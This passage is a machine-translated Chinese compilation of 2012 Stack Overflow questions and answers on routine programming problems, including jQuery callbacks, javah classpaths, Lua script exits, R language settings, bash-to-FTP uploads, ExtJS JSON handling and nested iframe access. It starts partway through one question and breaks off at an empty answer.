Jquery docs 说 .done() 等同于成功， .fail 等同于失败（来源：[http](http://api.jquery.com/deferred.fail/) ://api.jquery.com/deferred.fail/ ）

我的`saveData()`功能：

```
function saveData()
        {
            var data_save = $('#eciform').serializeArray();
            return $.ajax
                ({
                    type:"post",
                    url:"inputajax.cfm?mode=3",
                    data:data_save                  
                });
        } 
```

它怎么能同时返回 ok 和 not ok？它应该是成功或失败。是不是因为它只适用于 GET 而不是 POST？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:20:30.313

.done() 和 .fail() 需要在 function() 内

```
function doneCallback(){
    alert("this was ok");
}

function failCallback(){
    alert("this was not ok");
}

$.when(saveData()).done(doneCallback).fail(failCallback); 
```

或者干脆

```
$.when(saveData()).done(function(){alert("ok");}).fail(function(){alert("not ok");}); 
```

# android - javah 错误：无法访问活动

> ID：12760475
> 
> 赞同：3
> 
> 时间：2012-10-06T14:03:38.160
> 
> 标签：android, android-ndk, javah

我试图为我的 Android NDK 应用程序使用 Javah 制作一个 .h 文件。我正在使用 cygwin 为我做同样的事情。

将工作区修复到我当前应用程序的 bin 文件夹，我执行了这个命令：-

```
javah -classpath /cygdrive/c/Android/android-sdk/platforms/android.jar myNDK\bin\classes my.first.NDK.MyNDKActivity 
```

但是，它始终给出以下错误：-

```
error: cannot access myNDKbinclasses
class file for myNDKbinclasses not found
javadoc: error - Class myNDKbinclasses not found.
error: cannot access my.first.NDK.MyNDKActivity
class file for my.first.NDK.MyNDKActivity not found
javadoc: error - Class my.first.NDK.MyNDKActivity not found.
Error: No classes were specified on the command line.  Try -help. 
```

谁能帮我解决这个问题？

我还尝试转到包含 java 文件的文件夹并在那里执行 javah，但仍然遇到相同的错误：-

```
error: cannot access MyNDKActivity
class file for MyNDKActivity not found
javadoc: error - Class MyNDKActivity not found.
Error: No classes were specified on the command line.  Try -help. 
```

我猜这以某种方式描述了这个问题是由于一些权限问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:19:06.367

您似乎在类路径上缺少分隔符：

```
javah -classpath /cygdrive/c/Android/android-sdk/platforms/android.jar:myNDK/bin/classes my.first.NDK.MyNDKActivity 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T14:37:43.790

android.jar 在你的行中做什么？！

另外，MyNDKActivity 是包含**本机**签名的类吗？

我以这种形式使用了 javah（它对我有用）：

```
javah -d output/ -classpath /home/bod/path/to/eclipse/workspace/project/classes com.myapp.NDKBridge 
```

在哪里：

**-d output/**是收集生成的头文件的目录

**-classpath /home/.../classes** - 项目中包含类的文件夹

**com.myapp.NDKBridge** - 声明*本机*签名的类的名称。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-06T15:59:33.157

最后，我解决了我的问题。我使用的类路径有问题。这是最终的解决方案：-

1.  从哪里执行命令`$PROJECT_DIRECTORY/src`

2.  Android 构建系统的 ant 部分实际上将类文件放在`bin/classes`. 所以类路径的形式应该是 $PROJECT_DIRECTORY/bin/classes

3.  `javah -classpath ../bin/classes my.first.NDK.MyNDKActivity`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-01-13T13:36:20.293

也许它可以工作！添加您的 sdk 路径的选项 [-bootclasspath]。

> javah -bootclasspath /home/lmdyyh/development/adt-bundle-linux-x86-20131030/sdk/platforms/android-19/android.jar -classpath bin/classes -d jni com.myndk.Myndk

# lua - 如何终止 Lua 脚本？

> ID：12760476
> 
> 赞同：14
> 
> 时间：2012-10-06T14:03:44.850
> 
> 标签：lua, minecraft, computercraft

我将如何终止 Lua 脚本？现在我遇到了 exit() 的问题，我不知道为什么。（这更像是一个 Minecraft ComputerCraft 问题，因为它使用包含的 API。）这是我的代码：

```
while true do

    if turtle.detect() then

        if turtle.getItemCount(16) == 64 then

            exit() --here is where I get problems

        end

        turtle.dig() --digs block in front of it

    end

end 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-10-06T14:38:45.667

正如 prapin 的回答所述，在 Lua 中，该函数`os.exit([code])`将终止主机程序的执行。然而，这可能不是您想要的，因为调用`os.exit`不仅会终止您的脚本，还会终止正在运行的父 Lua 实例。

在*Minecraft ComputerCraft*中，调用`error()`也将完成您正在寻找的内容，但将其用于其他目的而不是在发生错误后真正终止脚本可能不是一个好习惯。

因为在 Lua 中，所有脚本文件也被认为是具有自己作用域的函数，退出脚本的首选方法是使用`return`关键字，就像从函数返回一样。

像这样：

```
while true do

    if turtle.detect() then

        if turtle.getItemCount(16) == 64 then

            return -- exit from the script and return to the caller

        end

        turtle.dig() --digs block in front of it

    end

end 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-10-16T06:59:42.427

该`break`语句将跳到它所在的 、 或 循环之后`for`的`while`行`repeat`。

```
while true do
    if turtle.detect() then
        if turtle.getItemCount(16) == 64 then
            break
        end
        turtle.dig() -- digs block in front of it
    end
end
-- break skips to here 
```

lua: 的一个怪癖`break`必须出现在 an 之前`end`，尽管不一定是`end`你想要跳出的循环的，正如你在这里看到的。

此外，如果您想在循环开始或结束的条件下退出循环，如上所述，通常您可以更改您正在使用的循环以获得类似的效果。例如，在本例中，我们可以将条件放入`while`循环中：

```
while turtle.getItemCount(16) < 64 do
  if turtle.detect() then
    turtle.dig()
  end
end 
```

请注意，我在那里稍微改变了行为，因为这个新循环将在达到项目计数限制时立即停止，而不会继续直到`detect()`再次变为真。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-06T14:19:06.953

`exit`标准 Lua中没有命名全局函数。

但是，有一个`os.exit`功能。在 Lua 5.1 中，它有一个可选参数，即错误代码。在 Lua 5.2 上，有第二个可选参数，告诉 Lua 状态是否应该在退出之前关闭。

但请注意，*Minecraft ComputerCraft*可能提供与标准功能不同的功能`os.exit`。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-04-23T02:40:51.460

您也可以通过在海龟/计算机界面中按住`Ctrl + T`几秒钟来手动终止它。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-02-10T14:44:09.913

不要使用`while true`

做这样的事情：

```
running = true
while running do

    -- dig block
        turtle.dig() --digs block in front of it

    -- check your condition and set "running" to false
    if turtle.getItemCount(16) == 64 then
        running = false
    end

end 
```

此外，你不必`turtle.detect()`在挖掘之前打电话，因为会`turtle.dig()`在内部再次调用它

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-11-19T08:35:33.450

不要使用`while true`. 而不是它使用这样的东西：

```
while turtle.getItemCount(16) < 64 do
  if turtle.detect() then
    turtle.dig()
  end
end 
```

它会为你工作。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2014-04-10T00:09:09.950

shell.exit() 关闭计算机工艺中的 lua 脚本。欲了解更多信息，请访问[http://computercraft.info/wiki/Shell.exit](http://computercraft.info/wiki/Shell.exit)

# javascript - 附加带有已发布 html 的 div 时，如何保持换行符完整？

> ID：12760478
> 
> 赞同：1
> 
> 时间：2012-10-06T14:04:01.193
> 
> 标签：javascript, jquery

![步骤 1 2 3](../Images/1f9d2ef170dcbc7e813d02baaf293af2.png)

下面和上面是发生的 3 个步骤。

```
var newcontent = $("#commenthere").val();
alert(newcontent)
$('#commentarea').replaceWith(newcontent); 
```

我想要的是当内容被附加/替换时，无论如何，它显示

> 1
> 
> 2

在页面上而不是`1 2`

我尝试用 using 替换`\n`，`<br>`但`replace`它不起作用，因为它会导致语法错误，因为它将 javascript 代码移动到新行，从而破坏了函数。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T14:18:27.187

设置 div 的样式 `white-space: pre`应该可以解决这个问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T14:10:54.910

这对我有用：

```
str = str.replace( '\n', '<br>' ); 
```

**现场演示：http:** [//jsfiddle.net/QvFdy/1/](http://jsfiddle.net/QvFdy/1/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T14:16:31.257

听起来您需要一个`<pre />`标签，它将格式化文本，包括所有空白。

# wpf - 对于 ICommand 和 DelegateCommand 它在哪个线程上运行？

> ID：12760483
> 
> 赞同：5
> 
> 时间：2012-10-06T14:04:36.943
> 
> 标签：wpf, multithreading

我的应用程序使用`ICommand`s 将方法绑定到按钮。

我将这些命令初始化如下：

```
AnswerCommand = new DelegateCommand(AnsCommandExecute, AnsCommandCanExecute); 
```

我想知道`AnsCommandExecute()`方法是否适用于 UI 线程或后台线程？

如果它适用于 UI 线程，我是否必须为此 execute() 方法创建另一个线程，因为我的应用程序在后台执行大量处理。

此外，我的应用程序使用 TCP 与另一个应用程序进行通信。所以，为了获得更好的性能，我是否必须使用不同的线程来接收数据、处理和发送数据。对于此类应用程序，最好的线程方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T14:46:44.920

确定`AnsCommandExecute()`方法是否在主线程上工作的最简单方法是在方法中放置断点并检查调用堆栈。

快速回答是肯定的 -`AnsCommandExecute()`将在主线程上执行。

`AnsCommandExecute()`为了满足您的线程要求，您可以在单独的线程中调用内容。这将使 UI 响应。

如果您要异步接收响应，则必须在“ [Dispatcher](https://web.archive.org/web/20080513013206/http://msdn.microsoft.com/en-us/magazine/cc163328.aspx) ”的帮助下将操作移回主线程。更多信息请[参见 Dispatcher 文档](https://docs.microsoft.com/en-us/dotnet/api/system.windows.threading.dispatcher)。

# list - 从 SharePoint 列表中获取限制记录到 SSRS 2008 R2

> ID：12760489
> 
> 赞同：1
> 
> 时间：2012-10-06T14:05:39.533
> 
> 标签：list, sharepoint-2010, reporting-services, ssrs-2008

我试图从 Sharepoint 2010 列表中获取特定数据到 SQL Server 2008 R2 报告服务中，我使用数据源作为 SharePoint 列表，然后我使用查询生成器设置数据集，之后我得到了这个代码：

```
<RSSharePointList xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <ListName>Minstry of Labor</ListName>
  <ViewFields>
    <FieldRef Name="Title" />
    <FieldRef Name="Employee_x0020_No_x002e_" />
    <FieldRef Name="Non_x002d_Employee_x0020_No_x002e" />
    <FieldRef Name="Total" />
    <FieldRef Name="Entry_x0020_Date" />
    <FieldRef Name="Employee_x0020_No_x0020__x0025_" />
    <FieldRef Name="ID" />
  </ViewFields>
</RSSharePointList> 
```

此查询将返回列表中的所有数据，我只想获取最后一条记录，而不是所有记录，我该怎么做，谢谢

# windows - R 控制台是我的母语，如何将 R 设置为英语？

> ID：12760491
> 
> 赞同：65
> 
> 时间：2012-10-06T14:06:14.007
> 
> 标签：windows, r, localization, settings, rstudio

我在 Windows 7 上使用 R。显然，R 以某种方式发现了我会说英语以外的其他语言的证据，并且顽固地坚持以我自己的语言在控制台中提供输出。由于各种原因，这是不可取的，我希望 R 是英语。

## 什么有效

我可以`LANGUAGE=en`用作 R 控制台桌面快捷方式的命令行选项，但 Rstudio 中的语言仍然是错误的，它直接启动 R 可执行文件，因此忽略快捷方式中的命令行参数。

## 什么不起作用

我尝试`.Renviron`在 下创建一个文件，这是由,`C:\Users\[MY_NAME]\Documents`为工作目录返回的路径。R忽略了这一点。我的和变量显示应该是正确的文件名。`getwd()``LANGUAGE=en``R_ENVIRON``R_ENVIRON_USER``""``.Renviron`

我也尝试过`.Renviron`在`R_HOME\etc`（`R_HOME`指向`C:/PROGRA~1/R/R-215~1.0`）下创建，R 也忽略了它。

`Sys.setenv(LANGUAGE="en")`我在添加方面有些成功`R_HOME\etc`- 这使得 R 控制台的所有输出都是英语，除了最初的版权信息。

## 问题

如何使 R 默认为英语，以便将其传播到 RStudio？

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2012-10-06T14:06:14.007

在全新安装时，添加`language = en`到`Rconsole`文件（默认情况下存在于 下`R_HOME\etc`）将使 R 的语言在 R 控制台和 RStudio 中变为英语。这可以被工作目录中的代码和 RStudio 的各个项目覆盖。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2015-06-14T06:24:58.253

首先，转到`etc`R 程序文件文件夹下的文件夹。然后找到`Rconsole`文件。找到该行`language =`，`language = en` 如果您想用英文运行 R，请将其更改为。

**注意**：右键单击 Rconsole 文件图标，选择属性并授予自己修改文件的权限。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2013-01-02T17:13:54.273

它应该是 Rconsole 文件，而不是 Rprofile.site。

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2013-07-02T15:37:58.480

问题不在 R 或 RStudio 中，问题出在您的 Windows 语言配置中。

如果您使用的是 Windows，则必须这样设置（例如 Windows 7）：

1.  控制面板
2.  地区和语言。

    2.1。转到“管理”选项卡

    *   “非Unicode程序的语言”，然后在“更改系统区域设置”按钮中进行设置。

    2.2\. 如果需要，您还可以在“格式”中将其设置为“格式”选项卡。

干杯，达尔文电脑

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2015-08-05T14:54:39.123

1.  进入R安装目录，即`C:\Program Files\R\`

2.  从那里进入子文件夹`etc/`

3.  使用文本编辑器（即记事本）打开文件`Rconsole`

4.  查看文件中的行`language =`

5.  将这样的行替换为`language = en`

6.  保存并关闭`Rconsole`文件，再次运行Rgui，界面为英文

***R 版本 3.1.3***

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-02-21T01:46:09.810

我有同样的问题。我通过将笔记本电脑的系统偏好设置->地区更改为美国来解决了这个问题。然后，重新安装R。系统语言最终更改为英文。

> 会话信息（）

locale: [1] en_US.UTF-8/en_US.UTF-8/en_US.UTF-8/C/en_US.UTF-8/en_US.UTF-8

# jquery - 从自定义 viewhelper 调用 jquery datepicker viewhelper

> ID：12760492
> 
> 赞同：0
> 
> 时间：2012-10-06T14:06:17.123
> 
> 标签：jquery, zend-framework, viewhelper

我在 app/view/helper 文件夹中有一个自定义视图助手。添加文本字段的代码是 - 在我的代码中： $this->view->formText('date'); 但不是文本字段，我想像这样添加 jquery datepicker： $this->view->datePicker('date');

但这不起作用。请帮忙。问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T14:30:04.810

原则上，您不需要为此使用视图助手。

在客户端，只需将 jQuery 数据选择器附加到您的元素。您如何使用客户端选择器定位该元素取决于您在页面/表单中可用的 DOM 挂钩，但作为示例，假设一个带有 id 的表单和一个带有您希望用作的`myForm`名称的输入字段`myDate`datepicker，你可以简单地使用：

```
function($){
    $(document).ready(function(){
        $('#myForm input[name="myDate"]').datePicker({
            // datepicker options here
        });
    });
}(jQuery); 
```

当然，这假定 jQuery 在运行时已加载，并且 datepicker 插件在文档对象上的 ready 事件触发时已加载。

# bash - 查找文件并将其发送到 ftp

> ID：12760494
> 
> 赞同：2
> 
> 时间：2012-10-06T14:06:28.693
> 
> 标签：bash, shell, ftp, find

我是 bash 脚本的新手，我必须编写一个脚本，在目录中找到最新的 .mpg 文件，然后将其发送到 ftp 服务器。到目前为止，我找到了找到我的文件的命令。

```
#! /bin/bash

find /home/user/directory -type f -mmin -50 -name *.mpg \( ! -regex ".*/\..*" \) 
```

这可行，但我不知道如何将该命令的输出发送到 ftp 服务器。我读过我必须使用变量，但到目前为止我无法理解它们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:09:02.460

使用可以通过管道将一个命令的输出作为另一个命令的输入`|`

```
find /home/user/directory -type f -mmin -50 -name *.mpg \( ! -regex ".*/\..*" \) | ftp ... 
```

查找最新 mpg 文件的更简单方法：

```
ls -rt /home/user/directory/*.mpg | head -1 | ftp ... 
```

如果您想发送多个文件，则需要[xargs ，即 5 个最新文件](http://en.wikipedia.org/wiki/Xargs)

```
ls -rt /home/user/directory/*.mpg | head -5 | xargs ftp ... 
```

`ls`列出`/home/user/directory/*.mpg`where中的文件`*`扩展为带有扩展名的任何文件名`.mpg`。`-t`告诉`ls`按时间顺序列出并且`-r`是反向排序，因为我们想要最新的在前而不是最旧的。该`head`命令仅用于显示我们想要的结果数，例如 1`-1`或 5 `-5`。`head`通常用于仅查看文件中一定数量的行，以查看我们将运行的文件中的第一行`head -1 file.txt`。

管道示例：

`grep`用于在文件/标准输出中搜索文本

因此，如果您想知道是否`firefox`包含在第一行中，`file.txt`我们将`pipe`输出`head -1 file.txt`to`grep firefox`

`head -1 file.txt | grep firefox`

您可以将多个命令连接在一起以实现您想要的结果。

# typo3 - TYPO3 调度器没有调度？

> ID：12760495
> 
> 赞同：0
> 
> 时间：2012-10-06T14:06:32.007
> 
> 标签：typo3, fastcgi, scheduler

我已经安装了 TYPO3 计划，但它没有计划。我每 5 分钟设置一个 cron 作业来运行 TYPO3 调度程序，并在我的系统日志中打印出以下行：

> 10 月 6 日 14:00:01 服务器 /USR/SBIN/CRON[31775]: (root) CMD (/usr/local/bin/php /var/www/typo3/cli_dispatch.phpsh 调度程序)

因此我认为 cron 工作正在工作，但在我的 TYPO3 后端我看不到时间表。TYPO3 脚本似乎没有正确启动。当我`cli_dispatch.phpsh`从 shell 运行时，它给了我许多奇怪的错误。该脚本具有所需的每个用户权限。谢谢你的帮助！

当我使用 sh cli_dispatch.phpsh 调度程序从终端开始时，它给出：

```
sh cli_dispatch.phpsh scheduler 
cli_dispatch.phpsh: line 2: ?php: Datei oder Verzeichnis nicht gefunden
cli_dispatch.phpsh: line 3: /120120.tgz: Keine Berechtigung
cli_dispatch.phpsh: line 4: ajax.php: command not found
cli_dispatch.phpsh: line 5: ajax.php: command not found
cli_dispatch.phpsh: line 6: syntax error near unexpected token `c'
cli_dispatch.phpsh: line 6: `*  (c) 2005-2008 Kasper Skaarhoj (kasperYYYY@typo3.com)' 
```

它在启用 fastcgi 的情况下是否有效？

当我启动 cli_dispatcher 脚本时，PHP 给出了版权信息，但在 TYPO3 后端，甚至在协议中都没有。在设置检查中，我在 TYPO3 中手动引导的最后日期，但不是来自 cronjob 或我的终端。

我启用了 cli 模式但`php -v`没有提供任何版本信息或 cli 提示？

> 配置命令 'configure' '--enable-fastcgi' '--enable-force-cgi-redirect' '--with-gettext' '--with-mysql' '--with-dom=/usr/include/libxml2 /libxml' '--enable-so' '--with-pcre-regex' '--prefix=/usr' '--datadir=/usr/share/php5' '--with-libdir=lib' '- -includedir=/usr/include''--with-config-file-scan-dir=/etc/php5/conf.d''--enable-libxml''--enable-filter''--enable-session ' '--enable-xml' '--enable-simplexml' '--enable-spl' '--enable-inline-optimization' '--enable-zend-multibyte' '--disable-rpath' '-- enable-cli' '--with-zlib' '--enable-soap' '--enable-mbstring' '--with-jpeg-dir=/usr' '--with-png-dir=/usr' ' --with-gd''--with-ttf' '--enable-gd-native-ttf' '--with-freetype-dir=/usr/lib' '--with-curl=/usr/local/curl' '--with -阅读线'

我也无意中启用`cgi.check_shebang_line`了我的。`php.ini`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-07T12:45:12.020

您可以`Setup Check`在调度程序模块内部进行选择，以查看调度程序是否已被触发。

# jquery - jQuery删除特定元素后的最后三个元素

> ID：12760500
> 
> 赞同：1
> 
> 时间：2012-10-06T14:06:54.033
> 
> 标签：jquery

如何在特定元素（p#heading）之后删除**最后三个项目（具有相同的类）？**

```
<p id="heading">HEADING</p>
<p class="txt"></p>
<p class="txt"></p>
<p class="txt"></p>
<p class="txt"></p>
<p class="txt"></p>
<p class="txt"></p> 
```

已经谢谢了！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:13:50.073

尝试这个：

```
$("p#heading").siblings(".txt").slice(-3).remove(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T14:18:22.453

这将匹配[后面](http://api.jquery.com/nextAll/)`.txt`的元素并将选择[分割](http://api.jquery.com/slice/)为匹配集中的最后三个。 `p#heading`

```
$matchedElements = $('p#heading').nextAll('.txt').slice(-3);​​ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T14:29:16.583

您需要使用`~`选择器。

```
$(document).ready(function() {
    var allTxt = $('#heading ~ .txt');
    var toBeRemoved = allTxt.slice(allTxt.length - 3);
    toBeRemoved.remove();
});​​ 
```

# jsp - 使用 json 对象重定向

> ID：12760501
> 
> 赞同：0
> 
> 时间：2012-10-06T14:07:16.423
> 
> 标签：jsp, servlets, extjs, extjs4, extjs4.1

我的 UI 中有两个组合框。第一个组合框包含国家名称列表，第二个组合框包含该国家/地区的州列表。从第一个组合开始，当我选择国家时，名称被发送到 servlet。使用该名称命中数据库，检索状态名称列表并将其转换为 JSONObject。现在我无法将此 JSONObject 传递回 extjs 文件以使用状态列表填充第二个组合框。

这是js文件的代码：

```
 Ext.require('Ext.tab.*');
Ext.require('Ext.button.*');

Ext.define('Country',{
    extend: 'Ext.data.Model',
    fields: [
        { name: 'id', type: 'string' },
        { name: 'name', type: 'string' }
    ]
});

Ext.define('CountryCombo', {
    extend: 'Ext.form.field.ComboBox',
    alias: 'widget.countrycombo',
    allowBlank: false,
    queryMode: 'local',
    valueField: 'id',
    displayField: 'name',
    store: {
        model: 'Country',
        data: [
            { id: 'China', name: 'China'},
            { id: 'Japan', name: 'Japan'},
            { id: 'Malaysia', name: 'Malaysia'}
        ]
    },
    listeners: {
        "select": function(obj){  
            Ext.Ajax.request({
                url: '/CellEditing/FormServlet',
                method: 'POST',
                params: {
                    data: obj.getValue()
                },
                success: function(obj){
                    alert('sucess');
                    var respText = eval('('+ obj.responseText +')');
                    alert(respText);
                },
                failure: function(obj){
                    alert('failure');
                }
            });                 
        }
    }
});

Ext.define('State',{
    extend: 'Ext.data.Model',
    fields: [
        { name: 'id', type: 'int' },
        { name: 'name', type: 'string' }
    ]
});

Ext.define('StateCombo', {
    extend: 'Ext.form.field.ComboBox',
    alias: 'widget.statecombo',
    allowBlank: false,
    queryMode: 'local',
    valueField: 'id',
    displayField: 'name',
    store: {
        model: 'State',
        data:[]
    }
});

Ext.onReady(function(){
    Ext.tip.QuickTipManager.init();
    Ext.widget('panel', {
        renderTo: 'pan1',
        title: 'Basic Panel',
        width:600,
        height:100,
        defaults: {
            bodyPadding: 10,
            border: false,
            xtype: 'panel',
            layout: 'anchor'
        },
        layout: 'hbox',
        items: [{
                  fieldLabel: 'Country',
                  xtype: 'countrycombo',
                  width: 234,
                  margin: '5 5 5 5'
               },{
                  fieldLabel: 'State',
                  xtype: 'statecombo',
                  width: 234,
                  margin: '5 5 5 5'
               }]            
    });  
}); 
```

这是小服务程序：

```
@Override
protected void doPost(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException {
    // TODO Auto-generated method stub
    System.out.println("Inside Post");
    String selectedValue = req.getParameter("data");
    System.out.println(selectedValue);
    //This is the json string I want to send back to the UI
    //The format of this json is correct, I verifieded it printing in console.
    String jsonString = new StateHelper().getStates(selectedValue);
    //Below are the lines I am having the doubt, it is not correct.
    req.setAttribute("data", jsonString);
    req.getRequestDispatcher("combo.jsp").forward(req, resp);
} 
```

combo.jsp 是包含两个组合框的文件。运行此代码，我收到带有“失败”消息的警报。

它的说明：这一行中的语法错误：

```
var respText = eval('('+ obj1.responseText +')'); 
```

请让我知道如何解决此问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-23T13:51:45.800

var respText = Ext.JSON.decode(obj.responseText);

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T18:31:35.713

脑海里闪过两个念头。。

首先，为什么您使用 POST 而不是 GET？

第二次尝试使用以下设置请求/响应标头：

```
'Accept' : 'application/json'
'Content-type' : 'application/json' 
```

# javascript - 如何在两个 iframe 中获取元素的属性

> ID：12760507
> 
> 赞同：4
> 
> 时间：2012-10-06T14:08:40.840
> 
> 标签：javascript, jquery, html, iframe, href

```
<html>
  <head></head>
  <body>
    <iframe id="num1" src="/idk">
      <html>
        <head></head>
        <body>
          <iframe id="num2" src="/idk2">
            <html>
              <head></head>
              <body>
                <div id="div1">
                  <div id="div2">
                    <a href="http://www.blablabla.com"></a>
                  </div>
                </div>
              </body>
            </html>
          </iframe>
        </body>
      </html>
    </body>
    </html> 
```

我的问题是 - 如何使用 javascript 或 jquery 在这两个 iframe 和两个 div 中获取 a 标签的 href 属性，我更喜欢 JS。（例如：“http://www.blablabla.com”）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:38:03.687

好的，所以获得第一个 iframe 很容易。只需在标签上添加一个`name`属性并使用它来获取其对象，然后该对象可用于引用该iFrame 的。期望返回相同的东西似乎是合理的，但后者返回 html 元素，而前者返回对您的目的更有用的实际窗口对象。`<iframe>``window.frames['<name-of-your-iframe>']``window``document``document.getElementById('num1')`

嵌套 iFrame 的问题在于，由于您正在设置`src`属性，我认为您无法如此轻松地获得访问权限。尽管您可以尝试使用相同的方法。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T15:14:55.417

这可能是一个丑陋的解决方案，但至少它有效而且它实际上非常简单：

```
// Create container to store iframes' inner HTML and to be able to work with it
var container = document.createElement("div");
// Add HTML of first iframe to container
container.innerHTML = document.querySelector("#num1").innerHTML;
// Add HTML of nested (second) iframe to container
container.innerHTML = container.querySelector("#num2").innerHTML;
// Finally get href attribute
var href = container.querySelector("#div2 a").getAttribute("href");
console.log(href); 
```

大多数现代浏览器已经支持`querySelector()`，您只会遇到旧 IE 的问题。请参阅[http://caniuse.com/queryselector](http://caniuse.com/queryselector)。

**编辑：**此代码基于以下想法：获取 iframe 的 HTML 内容并将其复制/插入到`div`元素中，以便能够直接对其执行查询（因此我们无需费心获取 iframe 的`document`对象）。对第一个 iframe 完成此操作后，我们将对第二个（嵌套）iframe 重复此操作。然后我们可以简单地读出所需元素的属性。`querySelector()`几乎可以像 jQuery 选择器一样使用（例如`$("#id")`）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-14T09:29:30.877

```
var iframe1 = document.getElementById('num1');
var innerDoc1 = iframe1.contentDocument || iframe1.contentWindow.document;

var iframe2 = innerDoc1.getElementById('num2');
var innerDoc2 = iframe2.contentDocument || iframe2.contentWindow.document; 
```

最后你得到

```
console.log(innerDoc2.getElementById('div2').getAttribute('href')); 
```

***这个简单的任务不需要框架**

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-14T09:21:56.137

尝试这样的事情：

```
​var $iframe1 = jQuery('#num1');
var iframe1Content = $iframe1[0].contentDocument || $iframe1[0].contentWindow.document;
// see also: http://stackoverflow.com/questions/926916/how-to-get-the-bodys-content-of-an-iframe-in-javascript/11107977#11107977

var $iframe2 = jQuery('#num2', iframe1Content);
var iframe2Content = $iframe2[0].contentDocument || $iframe2[0].contentWindow.document;

var $link = jQuery('#div2 a', iframe2Content);
console.log($link); 
```

jQuery-Selector-Method 'jQuery('selector', context)' 允许你指定一个'context'。这意味着一个 jQuery 元素，可以在其中找到“选择器”。首先获取第一个 iFrame 的内容（contentDocument），并将其作为选择第二个 iFrame 的上下文。

# jsf - SelectItem[] 制造商选项和列表之间的区别 制造商选项

> ID：12760510
> 
> 赞同：0
> 
> 时间：2012-10-06T14:09:01.920
> 
> 标签：jsf, primefaces

可能是一个愚蠢的问题，如果我使用`List<SelectItem>`而不是`SelectItem[]`，数据表过滤展示在 primefaces 数据表过滤[示例中根本不起作用](http://www.primefaces.org/showcase/ui/datatableFiltering.jsf)

在 Showcase TableBean.java 中，这有效

```
private SelectItem[] manufacturerOptions;
manufacturerOptions = createFilterOptions(manufacturers); 
```

但是如果我使用

```
List<SelectItem> manufacturerOptions:
manufacturerOptions = createFilterOptions(manufacturers); 
```

过滤器不起作用

**XHTML**

```
<p:column id="manufacturerColumn" filterBy="#{car.manufacturer}"   
                headerText="Manufacturer" footerText="exact"  
                filterOptions="#{tableBean.manufacturerOptions}"  
                filterMatchMode="exact">  
            <h:outputText value="#{car.manufacturer}" />  
        </p:column> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-07T08:38:00.913

听起来`<p:column>`只支持数组而不支持列表。所以它要么根本不受支持，要么是一个错误。您应该将此报告给 PrimeFaces 团队。

# java - Java - 两个具有相同方法的接口，一个只是通用的

> ID：12760511
> 
> 赞同：4
> 
> 时间：2012-10-06T14:09:02.030
> 
> 标签：java, interface, polymorphism

我一直认为具有相同方法的两个接口不能被一个类继承，正如许多问题中所述。

**Java jre 7，jdk 1.7**

但是这里的代码是有效的。

例子：

**接口：**

```
public interface IObject
{
    public Object create(Object object) throws ExceptionInherit;
}

public interface IGeneric<T>
{
    public T create(T t) throws ExceptionSuper;
} 
```

**实现类：**

```
public class Test implements IGeneric<Object>, IObject
{
    @Override
    public Object create(final Object object) throws ExceptionInherit
    {
        return object;
    }
} 
```

这两个方法声明不是具有相同的主体吗？

**例外：**

*例外只是对这个结构的补充，使它更复杂。*

```
public class ExceptionSuper extends Exception {}
public class ExceptionInherit extends ExceptionSuper {} 
```

***它也可以在没有任何抛出异常的情况下工作。***

**进一步：**如果两个方法接口抛出不同的继承异常，我可以强制`UserLogic`转换为两个接口中的任何一个并检索异常的不同子集！

为什么这行得通？

**编辑：**

```
The generic implementation is not even necessary:

public interface IA
{
    public void print(String arg);
}

public interface IB
{
    public void print(String arg);
}

public class Test implements IA, IB
{
    @Override
    public void print(String arg);
    {
        // print arg
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T14:24:38.163

> 现在我可以将 UserLogic 转换为两个接口中的任何一个，并检索一组不同的异常！

不，你不能。请参阅 Joshua Bloch 和 Neal Gafter 撰写的“Java Puzzlers：Traps, Pitfalls, and Corner Cases”，Puzzle 37 Exceptionally Arcane：

> 每个接口都限制了方法可以抛出的检查异常的集合。方法可以抛出的已检查异常集是声明为在所有适用类型中抛出的已检查异常集的交集，而不是联合。

所以在你的情况下实施

> 创建（用户用户）抛出异常继承

是正确的。但

> 创建（用户用户）抛出 ExceptionSuper

不会编译

* * *

## 回答 #2

> 赞同：2
> 
